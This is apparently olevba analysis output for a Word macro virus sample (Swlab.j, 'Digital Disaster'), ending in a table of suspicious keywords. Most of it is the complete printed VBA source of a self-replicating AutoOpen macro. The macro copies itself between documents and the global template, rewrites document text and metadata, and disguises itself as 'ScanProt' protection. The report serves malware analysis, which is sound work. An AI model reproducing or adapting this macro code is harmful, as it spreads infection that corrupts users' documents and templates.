olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Swlab.j-8f1ec5a9a114adf16c36f8660a9a1d45a553f5cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Swlab.j-8f1ec5a9a114adf16c36f8660a9a1d45a553f5cc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DISASTER.bas 
in file: Virus.MSWord.Swlab.j-8f1ec5a9a114adf16c36f8660a9a1d45a553f5cc - OLE stream: 'Macros/VBA/DISASTER'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DISASTER.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the DiGiTaL DiSaStEr Created by CyBer KiLlEr

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

Rem Virus Payload Area.

     WordBasic.FileSummaryInfo Subject:="Digital Disaster is Everywhere"
     WordBasic.EditReplace Find:="resume", Replace:="DIGITAL DISASTER", Wrap:=1
     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:DISASTER", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":DISASTER"
     WordBasic.MacroCopy "Global:DISASTER", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem The Legion of Doom had struckwith another Digital Disaster !!!!!!   DIE SUCKER !!!!!5_

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Swlab.j-8f1ec5a9a114adf16c36f8660a9a1d45a553f5cc - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the DiGiTaL DiSaStEr Created by CyBer KiLlEr

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

Rem Virus Payload Area.

     WordBasic.FileSummaryInfo Subject:="Digital Disaster is Everywhere"
     WordBasic.EditReplace Find:="resume", Replace:="DIGITAL DISASTER", Wrap:=1
     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:DISASTER", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":DISASTER"
     WordBasic.MacroCopy "Global:DISASTER", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem The Legion of Doom had struckwith another Digital Disaster !!!!!!   DIE SUCKER !!!!!5_

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Swlab.j-8f1ec5a9a114adf16c36f8660a9a1d45a553f5cc - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

